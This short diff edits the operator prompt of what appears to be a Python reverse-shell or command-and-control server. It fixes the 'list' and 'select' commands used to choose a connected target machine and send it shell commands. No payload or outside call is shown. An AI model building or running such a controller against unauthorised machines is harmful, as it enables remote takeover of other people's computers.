@@ -62,13 +62,13 @@ def accept_socket():
 def start_prompt():
     while True:
         cmd = input('Shell> ')
-        if cmd == 'lstc':
+        if cmd == 'list':
             list_connection()  #Liste les connections
             continue
         elif 'select' in cmd:
-            conn == get_trgt(cmd)  #Selectionne une cible dans la liste des connections grâce à un index
+            target, conn = get_trgt(cmd)  #Selectionne une cible dans la liste des connections grâce à un index
             if conn is not None:
-                send_trgt_cmd(conn)
+                send_trgt_cmd(target, conn)
         else:
             print("Command not found ! Try another one or \"help\"")
 
